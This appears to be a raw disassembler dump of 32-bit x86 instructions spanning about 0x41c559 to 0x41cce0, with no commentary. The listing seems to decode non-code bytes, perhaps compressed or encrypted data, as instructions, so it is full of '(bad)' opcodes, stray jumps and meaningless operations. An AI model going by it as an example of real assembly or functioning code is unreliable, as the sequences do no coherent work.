  41c559:	sub    edx,DWORD PTR [ebx*2-0x5f1f3e8e]
  41c560:	pop    ecx
  41c561:	and    DWORD PTR [ecx+0x5d],0x68
  41c565:	add    DWORD PTR [eax-0x3cf77cfa],ecx
  41c56b:	sub    DWORD PTR [ebp-0x43],0x4b
  41c56f:	push   ebp
  41c570:	scas   al,BYTE PTR es:[edi]
  41c571:	add    eax,0xeed3b3e7
  41c576:	push   0x15
  41c578:	fwait
  41c579:	jnp    0x41c547
  41c57b:	or     ecx,DWORD PTR [edx-0x2d]
  41c57e:	loopne 0x41c5d0
  41c580:	das    
  41c581:	xor    ecx,edx
  41c583:	mov    esp,0xf85fe201
  41c588:	hlt    
  41c589:	and    esi,0x4e08feff
  41c58f:	or     esi,0x34328ef
  41c595:	fiadd  WORD PTR [esi+0x2e]
  41c598:	sub    al,0xce
  41c59a:	mov    BYTE PTR [eax+edx*1],cl
  41c59d:	loop   0x41c5c4
  41c59f:	and    BYTE PTR [esi-0x39bc5c01],dh
  41c5a5:	jne    0x1fb9024
  41c5ab:	mov    eax,ds:0xb4ce6c8b
  41c5b0:	nop
  41c5b1:	add    DWORD PTR [ecx],edi
  41c5b3:	or     edi,edi
  41c5b5:	call   0x533c25a2
  41c5ba:	sbb    DWORD PTR [eax-0x3a],eax
  41c5bd:	xor    dh,BYTE PTR [ebx]
  41c5bf:	xor    al,0x35
  41c5c1:	push   es
  41c5c2:	cmp    BYTE PTR [ecx],bh
  41c5c4:	inc    ecx
  41c5c5:	inc    edx
  41c5c6:	mov    BYTE PTR [edi+0x45c91bf8],dh
  41c5cc:	inc    esi
  41c5cd:	inc    edi
  41c5ce:	dec    eax
  41c5cf:	dec    ecx
  41c5d0:	dec    edx
  41c5d1:	or     DWORD PTR [ebp+0x4e],ecx
  41c5d4:	dec    edi
  41c5d5:	(bad)  
  41c5d7:	push   esi
  41c5d8:	mov    ds:0x5655d0fc,eax
  41c5dd:	jns    0x41c638
  41c5df:	jg     0x41c5ca
  41c5e1:	add    dl,BYTE PTR [edi+0x6f63622e]
  41c5e7:	data16 and BYTE PTR [bp+si+0x6b],ch
  41c5ec:	ins    BYTE PTR es:[edi],dx
  41c5ed:	ins    DWORD PTR es:[edi],dx
  41c5ee:	outs   dx,BYTE PTR ds:[esi]
  41c5ef:	outs   dx,DWORD PTR ds:[esi]
  41c5f0:	xor    eax,0x70c6f568
  41c5f5:	jno    0x41c670
  41c5f7:	je     0x41c66e
  41c5f9:	jbe    0x41c660
  41c5fb:	xor    esp,DWORD PTR [edi-0x40]
  41c5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ff:	sub    cl,ch
  41c601:	and    ax,0xd388
  41c605:	add    BYTE PTR [eax-0x6dfc6f9],0xed
  41c60c:	mov    eax,0x2134f364
  41c611:	xchg   DWORD PTR [ebx+eiz*4],esp
  41c614:	add    dh,ch
  41c616:	or     bl,cl
  41c618:	ins    BYTE PTR es:[edi],dx
  41c619:	cmp    eax,DWORD PTR [ebx-0x71]
  41c61c:	adc    esi,eax
  41c61e:	push   edx
  41c61f:	add    eax,eax
  41c621:	in     al,0x50
  41c623:	fnstenv [esi]
  41c625:	(bad)  [esi-0x70]
  41c628:	sub    BYTE PTR [ebx+0xf],dl
  41c62b:	clc    
  41c62c:	inc    eax
  41c62d:	push   esp
  41c62e:	add    edx,DWORD PTR [eax]
  41c630:	cs xchg edi,eax
  41c632:	int    0xb2
  41c634:	cmp    BYTE PTR [edi+0x8],dl
  41c637:	pusha  
  41c638:	scas   al,BYTE PTR es:[edi]
  41c639:	loopne 0x41c5e7
  41c63b:	int3   
  41c63c:	mov    dh,0xcb
  41c63e:	in     eax,0xb6
  41c640:	pop    ecx
  41c641:	pushf  
  41c642:	inc    eax
  41c643:	fimul  WORD PTR [ebx]
  41c645:	enter  0x2cdd,0xdf
  41c649:	cld    
  41c64a:	stos   DWORD PTR es:[edi],eax
  41c64b:	fsub   QWORD PTR [ebx]
  41c64d:	xor    dh,BYTE PTR [ebx-0x38818080]
  41c653:	sahf   
  41c654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c655:	add    eax,0x89ee04b8
  41c65a:	inc    edx
  41c65b:	js     0x41c5fe
  41c65d:	jns    0x41c64e
  41c65f:	scas   eax,DWORD PTR es:[edi]
  41c660:	sti    
  41c661:	enter  0x8849,0xef
  41c665:	pop    eax
  41c666:	jo     0x41c622
  41c668:	xchg   esp,eax
  41c669:	or     DWORD PTR [eax-0x41885ffc],edi
  41c66f:	add    eax,0xb81052ab
  41c674:	cmp    al,al
  41c676:	shr    ah,1
  41c678:	push   es
  41c679:	je     0x41c5fe
  41c67b:	mov    BYTE PTR [eax+0x52ec1ca0],bh
  41c681:	cmp    eax,0x585ca7a1
  41c686:	dec    esp
  41c687:	pop    edx
  41c688:	mov    eax,0x1bde31ac
  41c68d:	jecxz  0x41c6ab
  41c68f:	loopne 0x41c632
  41c691:	and    eax,0xe0a3c50
  41c696:	fnstenv [ebp+0x35b160b6]
  41c69c:	sbb    al,0xdb
  41c69e:	shr    BYTE PTR [edi],1
  41c6a0:	ficomp WORD PTR [esi-0x23055c43]
  41c6a6:	push   esp
  41c6a7:	mov    eax,0xe85635bc
  41c6ac:	inc    edx
  41c6ad:	loopne 0x41c667
  41c6af:	int3   
  41c6b0:	mov    edx,0x574f65e0
  41c6b5:	test   BYTE PTR [edi],dh
  41c6b7:	mov    ds:0xfadca73c,eax
  41c6bc:	sub    ecx,DWORD PTR [ecx+edi*8]
  41c6bf:	xchg   edx,eax
  41c6c0:	fsub   QWORD PTR [esi+0x14]
  41c6c3:	lea    ecx,[ebp-0x24]
  41c6c6:	jbe    0x41c6db
  41c6c8:	call   0xbffaa3d4
  41c6cd:	push   edx
  41c6ce:	rol    BYTE PTR [edi-0x23],0xbc
  41c6d2:	add    eax,0xd85e4f7d
  41c6d7:	mov    eax,0x111453e8
  41c6dc:	les    eax,FWORD PTR [esp+eiz*2-0x7f32de1c]
  41c6e3:	out    dx,eax
  41c6e4:	push   es
  41c6e5:	push   0xa6514ee1
  41c6ea:	adc    al,0x69
  41c6ec:	mov    al,ds:0xb702c916
  41c6f1:	dec    edi
  41c6f2:	popa   
  41c6f3:	rol    BYTE PTR [edx+0x49],1
  41c6f6:	lahf   
  41c6f7:	sub    ecx,DWORD PTR [ebp-0x1]
  41c6fa:	mov    ch,0x24
  41c6fc:	mov    edx,0x629c7ad0
  41c701:	jne    0x41c712
  41c703:	xchg   ebp,eax
  41c704:	pop    edi
  41c705:	adc    bh,BYTE PTR [ebp+0x5161733e]
  41c70b:	inc    ebx
  41c70c:	pop    eax
  41c70d:	jns    0x41c779
  41c70f:	je     0x41c76b
  41c711:	sub    cl,bl
  41c713:	xchg   ebx,eax
  41c714:	cmp    esi,DWORD PTR [ebx+0x4b]
  41c717:	or     esi,DWORD PTR gs:[ebp+0x42]
  41c71b:	add    bh,bl
  41c71d:	and    BYTE PTR [ecx],ch
  41c71f:	xchg   edi,eax
  41c720:	add    cl,BYTE PTR [ebp+0x6c9d1b40]
  41c726:	jbe    0x41c7a6
  41c728:	xor    dl,BYTE PTR [ebx]
  41c72a:	mov    eax,eax
  41c72c:	add    BYTE PTR [ebx],al
  41c72e:	pop    ss
  41c72f:	pop    eax
  41c730:	and    bh,bh
  41c732:	jg     0x41c7a7
  41c734:	mov    ecx,0xe0240413
  41c739:	daa    
  41c73a:	retf   
  41c73b:	int3   
  41c73c:	enter  0xd7c9,0xcf
  41c740:	enter  0xcecd,0xdb
  41c744:	fcomp  st(2)
  41c746:	fxch   st(2)
  41c748:	fdiv   QWORD PTR [ecx-0x22039238]
  41c74e:	(bad)  
  41c750:	loopne 0x41c733
  41c752:	jecxz  0x41c79a
  41c754:	in     eax,0x2f
  41c756:	push   edi
  41c757:	out    dx,eax
  41c758:	jnp    0x41c6db
  41c75a:	outs   dx,DWORD PTR ds:[esi]
  41c75b:	inc    ebx
  41c75c:	push   edx
  41c75d:	jne    0x41c7cd
  41c75f:	je     0x41c78e
  41c761:	and    BYTE PTR gs:[ebp+0xf],ah
  41c765:	and    BYTE PTR [eax],al
  41c767:	inc    edi
  41c768:	xchg   edx,eax
  41c769:	or     esi,edx
  41c76b:	popa   
  41c76c:	je     0x41c78e
  41c76e:	xor    BYTE PTR [edi],bl
  41c770:	or     eax,DWORD PTR [eax]
  41c772:	mov    dh,0x77
  41c774:	inc    ebx
  41c775:	add    BYTE PTR fs:[edx],dh
  41c778:	dec    ebx
  41c779:	pop    ds
  41c77a:	add    BYTE PTR [eax+eax*1],bl
  41c77d:	add    ebx,DWORD PTR [esi]
  41c77f:	adc    bl,al
  41c781:	test   BYTE PTR [ebp+0x9],cl
  41c784:	sbb    eax,0x3d9e3917
  41c789:	retf   0x3000
  41c78c:	popa   
  41c78d:	not    DWORD PTR [eax+0x4052ef66]
  41c793:	data16 fld DWORD PTR [ebx]
  41c796:	adc    BYTE PTR [ebp+0x18],dl
  41c799:	add    BYTE PTR [ecx+ebx*1+0x4e],dl
  41c79d:	dec    edx
  41c79e:	inc    ebx
  41c79f:	aas    
  41c7a0:	sub    ecx,DWORD PTR [ebp-0x29]
  41c7a3:	std    
  41c7a4:	ja     0x41c751
  41c7a6:	add    BYTE PTR [esi+eiz*1+0x5],bl
  41c7aa:	and    eax,0xd8642a2e
  41c7af:	and    esp,eax
  41c7b1:	add    ebp,eax
  41c7b3:	lock xor al,0xcd
  41c7b6:	div    BYTE PTR [ebx+esi*1-0x8]
  41c7ba:	push   esi
  41c7bb:	add    ecx,DWORD PTR [eax]
  41c7bd:	adc    BYTE PTR [eax],bl
  41c7bf:	shl    DWORD PTR [ecx*2+0x302820d3],cl
  41c7c6:	cmp    BYTE PTR [eax+0x4d],al
  41c7c9:	shl    DWORD PTR [ecx*2+0x60585048],cl
  41c7d0:	push   0xd34d3470
  41c7d5:	xor    al,0x78
  41c7d7:	or     BYTE PTR [eax+0x34d39890],0x4d
  41c7de:	shl    DWORD PTR [eax-0x3f474f58],cl
  41c7e4:	dec    ebp
  41c7e5:	shl    DWORD PTR [ecx*2-0x1f272f38],cl
  41c7ec:	call   0xd517d5e1
  41c7f1:	xor    al,0xf8
  41c7f3:	add    BYTE PTR [edi+0x3003d702],bh
  41c7f9:	enter  0x8320,0x7
  41c7fd:	add    al,0x5
  41c7ff:	fs and eax,0x43516727
  41c805:	gs push 0x72
  41c808:	nop
  41c809:	inc    ecx
  41c80a:	mov    esi,0x78c46c07
  41c80f:	pop    ebx
  41c810:	inc    ecx
  41c811:	dec    esi
  41c812:	push   cs
  41c813:	jb     0x41c7e5
  41c815:	sub    BYTE PTR [eax+eax*4+0x3c],bl
  41c819:	cmp    eax,ecx
  41c81b:	leave  
  41c81c:	xor    al,0x5d
  41c81e:	in     al,dx
  41c81f:	dec    esp
  41c820:	pop    esi
  41c821:	add    BYTE PTR [edi+0x17],bl
  41c824:	and    DWORD PTR [edi-0x62],ecx
  41c827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c828:	pop    esi
  41c829:	pop    eax
  41c82a:	pop    edi
  41c82b:	mov    ah,0x72
  41c82d:	repnz in al,0x20
  41c830:	pop    esp
  41c831:	pop    ecx
  41c832:	jo     0x41c894
  41c834:	int3   
  41c835:	iret   
  41c836:	add    BYTE PTR [ebp+0x591ec10f],bl
  41c83c:	and    dh,al
  41c83e:	ja     0x41c7ca
  41c840:	xchg   ebx,eax
  41c841:	and    cl,al
  41c843:	add    DWORD PTR [ebp-0x6596a355],ecx
  41c849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c84a:	(bad)  [ebp+0x6c]
  41c84d:	add    edi,DWORD PTR [eax+edx*4-0x60]
  41c851:	mov    al,0xb2
  41c853:	imul   ebx,DWORD PTR [edx-0x1b2b3f5a],0x4dd808f4
  41c85d:	shl    DWORD PTR [ecx*8+0x48382818],cl
  41c864:	pop    eax
  41c865:	xor    ecx,DWORD PTR fs:[ebp-0x2d]
  41c869:	xor    al,0x78
  41c86b:	mov    BYTE PTR [eax+0x2c4664ac],bl
  41c871:	(bad)  
  41c872:	pop    esi
  41c873:	add    DWORD PTR [edx],eax
  41c875:	add    ecx,DWORD PTR [edx]
  41c877:	adc    eax,DWORD PTR [edi+eiz*4-0x20ab1ec5]
  41c87e:	jmp    DWORD PTR [eax]
  41c880:	add    ebp,DWORD PTR [eax+0x54]
  41c883:	out    0x11,eax
  41c885:	adc    al,0xa4
  41c887:	jecxz  0x41c809
  41c889:	or     ebp,eax
  41c88b:	loopne 0x41c8db
  41c88d:	fdiv   DWORD PTR [ebp-0x80]
  41c890:	mov    al,ds:0xa7f0101b
  41c895:	or     BYTE PTR [edi],cl
  41c897:	add    BYTE PTR [eax+0x33c3e3ee],bl
  41c89d:	cwde   
  41c89e:	add    edi,DWORD PTR [eax-0x39]
  41c8a1:	test   BYTE PTR [ebx],dl
  41c8a3:	jbe    0x41c8fb
  41c8a5:	adc    BYTE PTR [edi+edx*8-0x48],0xdb
  41c8aa:	jmp    0x36ad7a4b
  41c8af:	adc    edx,DWORD PTR [eax+0x8]
  41c8b2:	pop    ds
  41c8b3:	dec    eax
  41c8b4:	push   esp
  41c8b5:	push   ebx
  41c8b6:	mov    BYTE PTR ds:0xaf0ee9a7,bl
  41c8bc:	outs   dx,DWORD PTR ds:[esi]
  41c8bd:	enter  0x3780,0x14
  41c8c1:	xlat   BYTE PTR ds:[ebx]
  41c8c2:	je     0x41c8a1
  41c8c4:	enter  0x4102,0xc
  41c8c8:	das    
  41c8c9:	dec    eax
  41c8ca:	pop    es
  41c8cb:	add    al,0x10
  41c8cd:	add    ebx,DWORD PTR [ebp-0x6fa1144f]
  41c8d3:	sub    DWORD PTR [edi],0xffffffe0
  41c8d6:	add    esi,eax
  41c8d8:	push   esp
  41c8d9:	cmp    ebx,DWORD PTR [eax-0x39]
  41c8dc:	jmp    0x41c898
  41c8de:	xlat   BYTE PTR ds:[ebx]
  41c8df:	pop    es
  41c8e0:	mov    al,ds:0x3383b4b
  41c8e5:	pusha  
  41c8e6:	pop    es
  41c8e7:	arpl   si,bp
  41c8e9:	popf   
  41c8ea:	icebp  
  41c8eb:	mov    ebp,0x9f551f0b
  41c8f0:	jo     0x41c92d
  41c8f2:	xchg   ebx,eax
  41c8f3:	push   es
  41c8f4:	arpl   WORD PTR [eax],si
  41c8f6:	mov    edx,0xeb50b30c
  41c8fb:	and    BYTE PTR [ebx-0x4e61cc88],cl
  41c901:	jmp    0x41c942
  41c903:	mov    eax,0xc7559003
  41c908:	enter  0x9b54,0xec
  41c90c:	mov    edx,0xb70c0a33
  41c911:	and    BYTE PTR [ebx-0x48],bh
  41c914:	fwait
  41c915:	jo     0x41c96c
  41c917:	scas   eax,DWORD PTR es:[edi]
  41c918:	jmp    0x41c8b4
  41c91a:	into   
  41c91b:	aas    
  41c91c:	xor    al,bl
  41c91e:	sbb    ebx,DWORD PTR [ebx+ecx*1]
  41c921:	lock pop ebx
  41c923:	loope  0x41c92b
  41c925:	jecxz  0x41c99c
  41c927:	or     ebp,DWORD PTR [eax+0x2f44e3f7]
  41c92d:	xlat   BYTE PTR ds:[ebx]
  41c92e:	je     0x41c98d
  41c930:	mul    edi
  41c932:	inc    eax
  41c933:	adc    ebp,esp
  41c935:	jae    0x41c907
  41c937:	pop    es
  41c938:	cwde   
  41c939:	or     BYTE PTR [ebx+0x75],dl
  41c93c:	outs   dx,DWORD PTR ds:[esi]
  41c93d:	xor    BYTE PTR [edx-0x1724d7f5],bh
  41c943:	mov    ds:0x49eef83b,eax
  41c948:	int    0xee
  41c94a:	or     DWORD PTR [bx+si+0x5455],0x5f
  41c950:	and    al,0xf1
  41c952:	push   ebx
  41c953:	gs addr16 sahf 
  41c956:	push   cs
  41c957:	aas    
  41c958:	mov    edi,0x54d007f0
  41c95d:	pusha  
  41c95e:	inc    ecx
  41c95f:	push   0xffffff9a
  41c961:	dec    eax
  41c962:	mov    al,0x28
  41c964:	lahf   
  41c965:	add    BYTE PTR [eax],al
  41c967:	nop
  41c968:	push   ecx
  41c969:	adc    al,0x15
  41c96b:	popa   
  41c96c:	test   eax,0x99400388
  41c971:	pop    ds
  41c972:	add    al,0x20
  41c974:	inc    ecx
  41c975:	add    BYTE PTR [eax],cl
  41c977:	adc    BYTE PTR [eax],ah
  41c979:	ror    BYTE PTR ds:0x41301085,1
  41c97f:	fldenv [edx]
  41c981:	test   BYTE PTR [eax+0x50],cl
  41c984:	xor    eax,0xa2216115
  41c989:	or     esi,DWORD PTR [ebx]
  41c98b:	(bad)  
  41c98c:	aas    
  41c98d:	adc    BYTE PTR [ecx],al
  41c98f:	add    BYTE PTR [ecx+0x0],al
  41c992:	push   es
  41c993:	add    BYTE PTR [eax+eax*1+0x56],al
  41c997:	add    BYTE PTR [ebx+0x0],al
  41c99a:	dec    esp
  41c99b:	add    edi,edi
  41c99d:	aaa    
  41c99e:	fwait
  41c99f:	jnp    0x41c9ac
  41c9a1:	add    BYTE PTR [eax+0x7],dl
  41c9a4:	or     eax,0x4500474b
  41c9a9:	add    BYTE PTR [ecx+0x0],cl
  41c9ac:	dec    esi
  41c9ad:	add    BYTE PTR [esi+0x0],al
  41c9b0:	dec    edi
  41c9b1:	mov    bh,0xbf
  41c9b3:	jge    0x41ca08
  41c9b5:	adc    edx,edi
  41c9b7:	pop    DWORD PTR [eax]
  41c9b9:	push   0xffffff89
  41c9bb:	or     eax,0xef74009c
  41c9c0:	add    BYTE PTR [ebp+0x1a],ch
  41c9c3:	ror    BYTE PTR [edi-0x1b],0xff
  41c9c7:	(bad)  
  41c9c8:	inc    DWORD PTR [eax]
  41c9ca:	(bad)  
  41c9cb:	xchg   edi,eax
  41c9cc:	add    BYTE PTR [ebx+0x24a20010],bl
  41c9d2:	add    BYTE PTR [esi+0x20ea00a3],ah
  41c9d8:	add    BYTE PTR ds:0xbfbe0070,ah
  41c9de:	add    BYTE PTR [esi-0x4845ff4d],dh
  41c9e4:	std    
  41c9e5:	jg     0x41c9a2
  41c9e7:	mov    ch,0x58
  41c9e9:	inc    ecx
  41c9ea:	pop    esp
  41c9eb:	cmp    cl,BYTE PTR [esi+0x31001c39]
  41c9f1:	scas   eax,DWORD PTR es:[edi]
  41c9f2:	add    BYTE PTR ds:0xdd100013,ch
  41c9f8:	add    BYTE PTR [ebx-0x40000242],cl
  41c9fe:	and    DWORD PTR es:[edi+0xa2b200],ebx
  41ca05:	arpl   WORD PTR [edx],di
  41ca07:	add    BYTE PTR ds:0x31110093,dl
  41ca0d:	add    cl,al
  41ca0f:	mov    ah,0x0
  41ca11:	jg     0x41ca45
  41ca13:	jno    0x41ca4e
  41ca15:	add    BYTE PTR [edx],al
  41ca17:	jg     0x41c9f0
  41ca19:	(bad)  
  41ca1a:	fbstp  TBYTE PTR [edi+0x42]
  41ca1d:	mov    eax,0xcd0500
  41ca22:	test   BYTE PTR [edi],0x0
  41ca25:	pop    esi
  41ca26:	call   0xa90581
  41ca2b:	in     eax,0x63
  41ca2d:	add    BYTE PTR [ebp+0x15dfe8f0],dl
  41ca33:	add    eax,0x98b3a2
  41ca38:	aad    0x53
  41ca3a:	add    cl,dl
  41ca3c:	cmp    ebx,ebx
  41ca3e:	mov    bh,0x5f
  41ca40:	test   al,0xdd
  41ca42:	add    BYTE PTR ds:0x9e16003d,dh
  41ca48:	sar    DWORD PTR [edi],0x0
  41ca4b:	leave  
  41ca4c:	cmp    ebx,DWORD PTR [esi-0x1]
  41ca4f:	fcomi  st,st(6)
  41ca51:	in     eax,dx
  41ca52:	xchg   BYTE PTR [eax],al
  41ca54:	iret   
  41ca55:	dec    edx
  41ca56:	cmp    al,0xa9
  41ca58:	add    BYTE PTR [edi+ebx*2],dl
  41ca5b:	shr    DWORD PTR [ecx],cl
  41ca5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca5e:	and    eax,DWORD PTR [eax]
  41ca60:	mov    eax,ds:0xe46200e0
  41ca65:	add    BYTE PTR [eax],dl
  41ca67:	jmp    FWORD PTR [edi-0x49]
  41ca6a:	data16 cmp BYTE PTR [edx],ah
  41ca6d:	int3   
  41ca6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca6f:	mov    ebp,0x7f8e00
  41ca74:	jecxz  0x41ca46
  41ca76:	add    BYTE PTR [ebp-0x249fffd],al
  41ca7c:	fild   DWORD PTR [esi]
  41ca7e:	jns    0x41cae0
  41ca80:	call   0x1428d0a
  41ca85:	pop    ebp
  41ca86:	add    BYTE PTR [edx-0x129d38d4],al
  41ca8c:	push   esi
  41ca8e:	call   FWORD PTR [edx+eax*1]
  41ca91:	add    BYTE PTR [eax-0x2031ff7f],ah
  41ca97:	add    BYTE PTR [ebp-0x25],bl
  41ca9a:	cmp    ebp,DWORD PTR [eax+eax*1+0x20]
  41ca9e:	jbe    0x41caa0
  41caa0:	lods   eax,DWORD PTR ds:[esi]
  41caa1:	or     al,BYTE PTR [eax]
  41caa3:	das    
  41caa4:	gs lock ja 0x41ca83
  41caa8:	mov    esi,0xf4f5c7b5
  41caad:	xchg   edx,ecx
  41caaf:	add    BYTE PTR [eax-0x674c039b],dl
  41cab5:	mov    bl,0xbf
  41cab7:	in     eax,dx
  41cab8:	(bad)  
  41cab9:	mov    dh,0xed
  41cabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cabc:	jp     0x41cae4
  41cabe:	or     ah,dl
  41cac0:	pop    edi
  41cac1:	ret    0x69fe
  41cac4:	jmp    0xee3dcefe
  41cac9:	mov    edi,0xb9edbf97
  41cace:	add    cl,dh
  41cad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cad1:	es repz add al,dh
  41cad5:	sbb    al,BYTE PTR [eax]
  41cad7:	jge    0x41ca89
  41cad9:	std    
  41cada:	add    eax,0x94286947
  41cadf:	add    BYTE PTR [ecx],cl
  41cae1:	leave  
  41cae2:	add    dl,dh
  41cae4:	jecxz  0x41ca8b
  41cae6:	idiv   bh
  41cae8:	(bad)  [esi+0x1832d738]
  41caee:	or     ah,bl
  41caf0:	sub    eax,DWORD PTR [eax]
  41caf2:	adc    ah,BYTE PTR [edi+0x545300]
  41caf8:	mov    ds:0x2fc5005b,eax
  41cafd:	fstp   TBYTE PTR [esi-0xd32244b]
  41cb03:	push   ds
  41cb04:	inc    edi
  41cb05:	or     BYTE PTR [ecx+0x70],bl
  41cb08:	mov    ch,0x0
  41cb0a:	rol    BYTE PTR [eax+0x7dbbaac3],1
  41cb10:	mov    edi,0x33b47d
  41cb15:	mov    cl,0x53
  41cb17:	xchg   esp,eax
  41cb18:	push   ecx
  41cb19:	add    BYTE PTR [ebx+0x26],bh
  41cb1c:	mov    edi,0xcae70531
  41cb21:	je     0x41cb7e
  41cb23:	mov    ebx,0x177f95
  41cb28:	xchg   ebp,eax
  41cb29:	lea    eax,[eax]
  41cb2b:	test   al,0x75
  41cb2d:	xchg   edx,eax
  41cb2e:	mov    DWORD PTR [edi],eax
  41cb30:	xor    ah,bl
  41cb32:	sti    
  41cb33:	fild   QWORD PTR [esi]
  41cb35:	sub    al,0xfc
  41cb37:	xor    BYTE PTR [eax],al
  41cb39:	jl     0x41cb36
  41cb3b:	add    BYTE PTR [ecx-0x57],bh
  41cb3e:	dec    esp
  41cb3f:	cmp    BYTE PTR [edi+0xebdaee],0xff
  41cb46:	faddp  st(2),st
  41cb48:	mov    edi,0x1f00ed75
  41cb4d:	cs aam 0xbf
  41cb50:	inc    esi
  41cb51:	add    eax,0xd29900ad
  41cb56:	add    BYTE PTR [ecx-0x31],dl
  41cb59:	xchg   esp,eax
  41cb5a:	pop    eax
  41cb5b:	fsub   DWORD PTR [eax-0x30f31e80]
  41cb61:	ret    
  41cb62:	jg     0x41cb8f
  41cb64:	fcomp  QWORD PTR [esi-0x44]
  41cb67:	and    DWORD PTR [eax],eax
  41cb69:	add    al,0xf2
  41cb6b:	repz mov dh,0x2e
  41cb6e:	mov    edi,0x570096bc
  41cb73:	bound  eax,QWORD PTR [eax]
  41cb75:	outs   dx,DWORD PTR ds:[esi]
  41cb76:	das    
  41cb77:	ins    BYTE PTR es:[edi],dx
  41cb78:	mov    bh,0x28
  41cb7a:	xchg   BYTE PTR ds:0x49e59225,ah
  41cb80:	call   0xaa:0xabbf1900
  41cb87:	dec    DWORD PTR [ebx]
  41cb89:	fild   DWORD PTR [ebp-0x74f3b395]
  41cb8f:	mov    al,0x78
  41cb91:	push   ebp
  41cb92:	stc    
  41cb93:	add    dl,dl
  41cb95:	jle    0x41cb97
  41cb97:	std    
  41cb98:	jnp    0x41cb9a
  41cb9a:	push   esi
  41cb9b:	mov    al,0x6d
  41cb9d:	fcomi  st,st(2)
  41cb9f:	add    eax,DWORD PTR [eax]
  41cba1:	dec    edi
  41cba2:	jo     0x41cc13
  41cba4:	mov    eax,ds:0xbc00b31d
  41cba9:	sbb    ebp,ebx
  41cbab:	sub    ah,BYTE PTR [eax+0x5ec4bd]
  41cbb1:	fnstsw WORD PTR [ecx+0x3dfaaf11]
  41cbb7:	pop    ss
  41cbb8:	fidiv  DWORD PTR [esi-0x2e40b050]
  41cbbe:	in     al,dx
  41cbbf:	jg     0x41cc2e
  41cbc1:	inc    edx
  41cbc2:	ss int 0xc8
  41cbc5:	xor    edx,edx
  41cbc7:	mov    edi,0x270f8390
  41cbcc:	mov    esi,0x233c8cd2
  41cbd1:	lahf   
  41cbd2:	sub    DWORD PTR [esi],ecx
  41cbd4:	pop    esp
  41cbd5:	and    ecx,ebp
  41cbd7:	enter  0x6d33,0xd3
  41cbdb:	sti    
  41cbdc:	inc    edx
  41cbdd:	jo     0x41cc12
  41cbdf:	ror    BYTE PTR [esp+edi*1+0x2d58dbf5],cl
  41cbe6:	retf   
  41cbe7:	and    ecx,ebp
  41cbe9:	enter  0xaba7,0x36
  41cbed:	pop    esp
  41cbee:	add    BYTE PTR [ebx-0x49],dl
  41cbf1:	mov    eax,0xba23b635
  41cbf6:	out    0x17,eax
  41cbf8:	mov    WORD PTR [ebx-0x41],?
  41cbfb:	and    ecx,esi
  41cbfd:	fidiv  DWORD PTR [esi+0x6b]
  41cc00:	fild   WORD PTR [eax]
  41cc02:	mov    edx,0xc50bbb00
  41cc07:	dec    ebp
  41cc08:	inc    ebx
  41cc09:	add    al,0x62
  41cc0b:	dec    edx
  41cc0c:	mov    bl,0xb7
  41cc0e:	(bad)  
  41cc0f:	mov    edi,0x5277bcdd
  41cc14:	sub    DWORD PTR [esi],edx
  41cc16:	add    BYTE PTR [eax+0x5a],ch
  41cc19:	add    BYTE PTR [ebx+0x2f],bl
  41cc1c:	data16 sti 
  41cc1e:	arpl   WORD PTR [eax],di
  41cc20:	jo     0x41cc85
  41cc22:	mov    eax,ds:0xef6af86d
  41cc27:	adc    esi,DWORD PTR [edx]
  41cc29:	imul   esi,DWORD PTR [ebx-0x647a92d6],0xb93f25a3
  41cc33:	mov    ebp,0xd708f412
  41cc38:	ins    DWORD PTR es:[edi],dx
  41cc39:	jnp    0x41cc1c
  41cc3b:	mov    dh,0x29
  41cc3d:	mov    ah,0x23
  41cc3f:	lods   eax,DWORD PTR ds:[esi]
  41cc40:	mov    dl,0x16
  41cc42:	sbb    eax,DWORD PTR [eax]
  41cc44:	pop    eax
  41cc45:	inc    edi
  41cc46:	fld    QWORD PTR ds:0xb636db70
  41cc4c:	pop    ecx
  41cc4d:	outs   dx,BYTE PTR ds:[esi]
  41cc4e:	imul   esi,DWORD PTR [edi+0xb55b6e9],0x4b6d797b
  41cc58:	mov    gs,WORD PTR [ebp+0x3f803843]
  41cc5e:	adc    eax,0x91e0a17d
  41cc63:	xchg   bh,al
  41cc65:	mov    eax,0xff9217ec
  41cc6a:	popa   
  41cc6b:	add    BYTE PTR [eax+0x7f],bh
  41cc6e:	push   eax
  41cc6f:	sbb    DWORD PTR [ecx+0x46],ebp
  41cc72:	sahf   
  41cc73:	dec    ebp
  41cc74:	out    0xd1,eax
  41cc76:	jbe    0x41cca3
  41cc78:	sahf   
  41cc79:	xchg   ecx,eax
  41cc7a:	data16 in al,0x89
  41cc7d:	lea    ebx,[ebx+ebx*1]
  41cc80:	stos   DWORD PTR es:[edi],eax
  41cc81:	pop    ecx
  41cc82:	push   ds
  41cc83:	imul   eax,DWORD PTR [esi-0x71],0x3c001720
  41cc8a:	scas   eax,DWORD PTR es:[edi]
  41cc8b:	mov    dh,0x8d
  41cc8d:	in     eax,0x1f
  41cc8f:	jae    0x41ccdf
  41cc91:	add    BYTE PTR [edi-0x120fff3a],cl
  41cc97:	(bad)  
  41cc98:	rol    ch,1
  41cc9a:	push   ecx
  41cc9b:	jae    0x41cd19
  41cc9d:	fcmovnu st,st(0)
  41cc9f:	mov    ecx,0x57672e1
  41cca4:	mov    ds:0xffd400f8,eax
  41cca9:	imul   ebx,ebx,0xffffffc6
  41ccac:	jae    0x41cd11
  41ccae:	hlt    
  41ccaf:	aas    
  41ccb0:	addr16 inc esi
  41ccb2:	dec    ebx
  41ccb3:	int3   
  41ccb4:	mov    DWORD PTR [eax+edi*4+0x5b],0x37f505a1
  41ccbc:	add    BYTE PTR [ebp-0x2b551348],dh
  41ccc2:	test   eax,0xe36db637
  41ccc7:	daa    
  41ccc8:	add    BYTE PTR [edi+eax*4],dh
  41cccb:	fld    TBYTE PTR [esi-0x64]
  41ccce:	gs cdq 
  41ccd0:	push   ecx
  41ccd1:	lods   al,BYTE PTR ds:[esi]
  41ccd2:	imul   esi,DWORD PTR [esi-0x5f],0xe414b6d
  41ccd9:	jp     0x41cce6
  41ccdb:	ds test edi,edi
  41ccde:	mov    ah,0xc2
  41cce0:	pop    eax
